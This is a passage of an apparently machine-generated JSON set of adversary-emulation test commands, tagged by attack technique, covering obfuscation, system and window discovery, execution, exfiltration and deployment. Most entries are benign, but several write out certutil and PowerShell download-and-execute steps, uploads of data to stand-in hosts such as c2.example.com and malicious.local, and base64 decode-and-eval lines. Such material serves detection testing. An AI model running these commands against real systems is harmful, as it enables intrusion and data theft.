      "expected_behavior": "Creates a hidden temp directory, writes a base64 string (decodes to 'echo test'), reads it back, decodes, and executes. Demonstrates file-based obfuscation and data hiding using common PowerShell cmdlets.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.375769",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "c48a6fc0-973e-461c-aeed-b2150634fb1b",
      "ttp_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'Uryyb fgngrzrag' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
      "description": "Basic obfuscation using ROT13 to hide a string ('Hello statement')",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs the deobfuscated string 'Hello statement' to stdout",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:50.676577",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "18b2ba42-f7f9-4a48-ba32-8f13e4da49ce",
      "ttp_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "payload=$(echo 'VGhpcyBpcyBhIHRlc3QgcGF5bG9hZA==' | base64 -d); key=3; out=''; for ((i=0; i<${#payload}; i++)); do char=$(printf '%d' \"${payload:$i:1}\"); out+=$(printf '\\x%x' $((char ^ key))); done; echo \"$out\"",
      "description": "Intermediate obfuscation: base64-decode a string then apply single-byte XOR with key 3",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Deobfuscates and prints the original test string 'This is a test payload' using XOR decryption after base64 decoding",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:50.676577",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "636d2dfb-2ea2-4fb8-9910-be3e0136860e",
      "ttp_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "mkdir -p $HOME/.cache/update && echo '2b3a2b3a2b3a2b3a' > $HOME/.cache/update/.tmpbin && deobf=$(xxd -r -ps $HOME/.cache/update/.tmpbin | tr -d '\\0'); echo \"Deobfuscated: $deobf\"; rm -f $HOME/.cache/update/.tmpbin",
      "description": "Advanced: Stores hex-encoded obfuscated data in a hidden file, converts from hex, strips null bytes, and outputs result",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a hidden directory, writes obfuscated hex data, deobfuscates it by processing with xxd and tr, prints result, then cleans up the temporary file",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:50.676577",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "6b1c1e0c-74a0-482c-9b58-56b3ff505f36",
      "ttp_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "dir \"%USERPROFILE%\\Documents\" /a",
      "description": "List all files and directories in the user's Documents folder using legacy `dir` command.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a directory listing of the Documents folder, including hidden and system files, to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.335551",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "99ecca81-d8cb-4c18-a22c-53165f9aed69",
      "ttp_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-ChildItem -Path '%USERPROFILE%\\Downloads' | Where-Object { $_.Extension -match '\\\\.(docx|xlsx|pdf)$' } | Select-Object Name, Length, LastWriteTime\"",
      "description": "Use PowerShell to find common document files in the Downloads directory with specific extensions.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Displays a filtered list of .docx, .xlsx, and .pdf files from the user's Downloads folder, showing name, size, and modification time.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.335551",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "661f97b6-dffe-42e2-acb7-eb499e852085",
      "ttp_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ls -la ~/",
      "description": "List all files in the user's home directory, including hidden files, to discover potential web shells or configuration files.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs detailed list of files and directories in the user's home directory, including permissions, size, and timestamps.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.418295",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "23dbfcee-c7d3-4f87-acb7-2aa5a57e7cfe",
      "ttp_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "find ~/ -type f -name '1.aspx' 2>/dev/null",
      "description": "Search for a specific file named '1.aspx' in the user's home directory and subdirectories, a common web shell indicator.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Returns the full path to any file named '1.aspx' located under the home directory; suppresses permission errors.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.418295",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "bb2f0003-06fd-4457-a3fc-e2e01d300d5e",
      "ttp_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "stat ~/1.aspx 2>/dev/null || echo 'File not found or inaccessible'",
      "description": "Retrieve detailed metadata about a specific file if it exists, such as size, permissions, and timestamps.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays file metadata if the file exists and is readable; otherwise prints a benign message.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.418295",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "ac5db83c-b8b7-4c9b-b010-6c67f44c8134",
      "ttp_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "tasklist /V /FI \"STATUS eq RUNNING\" | findstr /I \"Window\"",
      "description": "Lists running processes with verbose output including window titles using legacy binaries.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of running processes that have a window title, filtered to only show those with 'Window' in the status or title. Uses built-in Windows tools and does not modify system state.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.262883",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "90ba611d-e149-43a9-976d-9d9300847c44",
      "ttp_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Name, MainWindowTitle\"",
      "description": "Uses PowerShell to retrieve processes that have a non-empty main window title, indicating visible application windows.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Enumerates all running processes with visible windows and displays their process name and window title. Uses standard PowerShell cmdlets without .NET reflection or unsafe operations.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.262883",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "14494cbf-493f-44ba-9899-72a1ce23f7a0",
      "ttp_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"& { $a = @(); $proc = Get-Process; foreach($p in $proc) { if($p.MainWindowTitle.Length -gt 0) { $a += [PSCustomObject]@{ ProcessName = $p.Name; WindowTitle = $p.MainWindowTitle } } }; $a } | Format-Table -AutoSize\"",
      "description": "Advanced PowerShell one-liner to collect and format processes with visible windows using a loop and custom object creation.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Builds a custom list of processes with non-empty window titles and outputs a formatted table. Demonstrates more complex scripting while remaining within safe, built-in cmdlet usage. No external tools or file operations involved.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.262883",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "578d4520-da1c-449e-80e3-1cac749c9bb1",
      "ttp_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "xwininfo -tree -root",
      "description": "Basic command to list all application windows in the current X11 session by querying the root window's child windows.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a hierarchical tree of all top-level and child windows managed by the X server. Used by attackers to identify running GUI applications.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "f09cfc00-6dda-4385-b44b-8d4a9ac555ba",
      "ttp_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "wmctrl -l",
      "description": "Intermediate command using wmctrl to list all open windows with their titles and identifiers.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints a list of windows currently managed by the window manager, including window IDs and titles. Helps attackers identify sensitive applications (e.g., terminals, browsers).",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "681856e6-b9bb-4a6b-889a-7258c1d0eb1f",
      "ttp_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "bash -c 'eval $(echo \"YmFzaCAtYyAnd21jdHJsIC1sJw==\" | base64 -d)'",
      "description": "Advanced obfuscated command that decodes and executes a base64-encoded wmctrl command to list open windows.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Decodes the base64 string 'YmFzaCAtYyAnd21jdHJsIC1sJw==' into 'bash -c 'wmctrl -l'', then executes it. Simulates stealthier discovery techniques used in post-compromise scenarios.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.219598",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "82696820-7140-4eed-999a-84cc145974b7",
      "ttp_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c echo Test payload execution via cmd >> \"%TEMP%\\debug.log\"",
      "description": "Basic command execution using cmd.exe to write a test string to a log file in the temp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates or appends 'Test payload execution via cmd' to debug.log in the user's temp directory",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.385134",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.69,
      "validated": true
    },
    {
      "id": "dd5ea266-4368-440c-99a7-f45d8935a397",
      "ttp_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f \"http://192.0.2.1/test.txt\" \"%TEMP%\\config.bin\" && cmd.exe /c \"%TEMP%\\config.bin\"",
      "description": "Intermediate command using certutil to download a file (simulated) and execute it via cmd",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a local IP (non-routable in test) and execute it. Will fail safely if unreachable, but simulates download-and-execute pattern",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.385134",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.69,
      "validated": true
    },
    {
      "id": "be104768-3952-4479-87f9-985d9dcc6206",
      "ttp_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = 'malicious_command.exe'; $path = \"$env:TEMP\\startup.bat\"; $content | Out-File -FilePath $path -Encoding ASCII; Start-Process $path } catch { } finally { Remove-Item \"$env:TEMP\\startup.bat\" -ErrorAction SilentlyContinue }\"",
      "description": "Advanced command using PowerShell to write a batch script, execute it, and clean up",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Writes a benign test batch file to temp, executes it (will fail safely), then attempts to remove it. Simulates script staging and execution with cleanup",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.385134",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.69,
      "validated": true
    },
    {
      "id": "44597337-4927-442f-ad07-9a5ecd181d7a",
      "ttp_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "bash -c 'echo \"Executing benign test command\" && sleep 2'",
      "description": "Basic execution using bash interpreter to run a simple command sequence",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints a message and pauses for 2 seconds",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.468262",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.69,
      "validated": true
    },
    {
      "id": "f00ba309-3c82-429b-be64-b3c09f922b9f",
      "ttp_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "bash -c 'echo \"ZWNobyAiSGVsbG8gZnJvbSBsaW9udGFpbCI=\" | base64 -d | bash'",
      "description": "Intermediate: Decodes and executes a base64-encoded command string using nested shell interpretation",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and runs 'echo \"Hello from liontail\"', outputting the message",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.468262",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.69,
      "validated": true
    },
    {
      "id": "6850b1f8-7900-4095-b1fe-d4380c0ad045",
      "ttp_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "export CMD='echo \"LIONTAIL mock execution\"'; bash -c \"$CMD\"; unset CMD",
      "description": "Advanced: Uses environment variable to store and execute command, simulating obfuscation techniques",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sets a command in an environment variable, executes it via bash, then unsets the variable",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.468262",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.69,
      "validated": true
    },
    {
      "id": "be1e8480-3db7-4b76-ae40-0cfdd30c5ec7",
      "ttp_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "echo testdata > \"%TEMP%\\debug.log\" & certutil.exe -urlcache -f http://192.168.1.100/upload.aspx PUT \"%TEMP%\\debug.log\"",
      "description": "Basic: Create a small test log file and upload it using certutil.exe over HTTP",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test file in %TEMP% and attempts to upload it via HTTP PUT. Fails silently if server is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.211999",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "c0e75a3b-23b3-493d-8e8d-d004a0e4a9df",
      "ttp_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "echo sensitive_data > \"%TEMP%\\config.bak\" & powershell -Command \"Compress-Archive -Path '%TEMP%\\config.bak' -DestinationPath '%TEMP%\\data.zip' -Force\" & certutil.exe -urlcache -f http://c2.example.com/exfil.php PUT \"%TEMP%\\data.zip\"",
      "description": "Intermediate: Create a file, compress it into ZIP archive, and exfiltrate using certutil",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a benign file, compresses it, and attempts to upload the archive via HTTP PUT. Uses built-in compression and avoids recursion.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.211999",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "5a018691-a5b4-4efc-967b-cd0e19a2932c",
      "ttp_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "cmd.exe /c \"echo exfil_payload > '%TEMP%\\trace.tmp' && powershell -Command \\\"$data = Get-Content '%TEMP%\\trace.tmp'; $wc = New-Object Net.WebClient; $wc.UploadString('http://malicious.local/ingest', 'POST', $data);\\\"\"",
      "description": "Advanced: Simulate data exfiltration using WebClient in PowerShell via encoded-like behavior without actual encoding",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary file, reads its content, and sends it via HTTP POST using WebClient. Mimics real exfiltration logic while staying within built-in tools.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:50:11.211999",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "d1544202-9d9d-4b35-82e2-faa953884586",
      "ttp_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "echo 'test_data' | curl -X POST -H 'Content-Type: text/plain' --data-binary @- http://127.0.0.1:8080/exfil",
      "description": "Basic exfiltration: Sends a test string directly to a local C2-like endpoint using curl.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends the string 'test_data' in the body of an HTTP POST request to http://127.0.0.1:8080/exfil. No file is created on disk. Fails silently if endpoint is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.210541",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "5c5d81f4-fa4f-401c-939d-6a3a7d402988",
      "ttp_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "echo 'sensitive_content' > $HOME/test_exfil.txt && gzip $HOME/test_exfil.txt && curl -X POST --data-binary @$HOME/test_exfil.txt.gz http://10.0.0.10:443/upload --header 'Content-Type: application/gzip' && rm -f $HOME/test_exfil.txt.gz",
      "description": "Intermediate exfiltration: Creates a test file, compresses it, sends it via HTTP POST, then deletes the compressed file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a file with test data, compresses it to .gz, uploads it to a remote server via curl, and removes the local .gz file. Simulates exfiltration of compressed data over C2 channel.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.210541",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "3ef91a85-7242-4a58-a147-ac209dbc9254",
      "ttp_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
      "technique_name": "Exfiltration Over Command and Control Channel",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "echo 'exfil_data' | base64 | xargs -I {} curl -s -X POST http://10.0.0.10:8080/api --data 'data={}' --header 'Content-Type: application/x-www-form-urlencoded'",
      "description": "Advanced exfiltration: Encodes test data in base64 and sends it as form data in a POST request to simulate encoded exfiltration over C2.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes the string 'exfil_data' in base64, then sends it in a POST request as URL-encoded form data to http://10.0.0.10:8080/api. Uses silent mode to suppress output. Simulates encoded data exfiltration over C2 channel.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:51:02.210541",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.688,
      "validated": true
    },
    {
      "id": "044035fe-1727-44a6-9b09-7ed9fc9edcd1",
      "ttp_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "systeminfo",
      "description": "Basic system information discovery using built-in systeminfo command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs detailed system information including OS version, hotfixes, system uptime, and network configuration to stdout",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.140307",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "b51a56ad-9086-4475-8f55-da4a4f65760d",
      "ttp_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "ipconfig /all & whoami /all & net user > %TEMP%\\sys_enum.txt 2>&1",
      "description": "Intermediate discovery command gathering network config, user context, and local user accounts, saving output to a temporary file",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Runs multiple discovery commands and appends output to %TEMP%\\sys_enum.txt, including IP configuration, user privileges, and local user accounts; may fail silently if not elevated",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.140307",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "42e3f97d-a3a4-44bf-907f-7a501afcf369",
      "ttp_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"try { $data = systeminfo; $output = '$env:COMPUTERNAME,$env:USERNAME,' + (Get-WmiObject -Class Win32_OperatingSystem).Caption; $path = '$env:TEMP\\info.log'; $output | Out-File -FilePath $path -Encoding ASCII -Force } catch { exit 1 }\"",
      "description": "Advanced discovery command using PowerShell to collect system and OS information and write to a temporary file with forced overwrite",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Gathers computer name, username, and OS caption, then writes comma-separated values to $env:TEMP\\info.log; uses -Force only for file write as allowed",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.140307",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "1afb2ba8-f683-4d29-8c41-180fecf3cff8",
      "ttp_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "uname -a; whoami; id; hostname",
      "description": "Basic system information discovery using common Linux commands to retrieve kernel version, current user, user ID, and hostname.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs kernel and OS version, current username, user and group IDs, and system hostname to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:47.703674",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "82c52361-d167-42dd-9399-e2dd17d522d4",
      "ttp_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ip addr show; cat /etc/os-release; ls /home 2>/dev/null",
      "description": "Intermediate system discovery: retrieves network interface configuration, OS distribution details, and lists user home directories.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays network interfaces and IP addresses, prints OS release information, and lists home directories if accessible.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:47.703674",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "3d0699ed-de1b-4703-b7d3-71ebd4d97a05",
      "ttp_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100:8080/deploy.bat %TEMP%\\deploy.bat && %TEMP%\\deploy.bat",
      "description": "Download a batch script using certutil and execute it locally",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Downloads a file from a specified HTTP endpoint to %TEMP%\\deploy.bat and executes it. The file is assumed to be a benign batch script for testing. certutil is a built-in Windows utility commonly abused for file download.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.326230",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "a17bcf10-dd9a-40fa-920c-a7f862f596f3",
      "ttp_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100:8080/payload.exe %TEMP%\\update.exe && start %TEMP%\\update.exe",
      "description": "Download an executable payload via certutil and launch it asynchronously",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Fetches a binary from a remote server and executes it from the temp directory. The 'start' command ensures execution in a separate process. This simulates deployment of custom malware components via web proxy.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:54:22.326230",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "a1bc13cd-b12b-4ec9-9e53-8e1ef97fd40c",
      "ttp_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $web = New-Object Net.WebClient; $data = $web.DownloadData('http://192.168.1.100:8080/cmd.b64'); $decoded = [System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($data)); $cmd = [System.Text.Encoding]::Unicode.GetString($decoded); Invoke-Expression $cmd } catch { }\"",
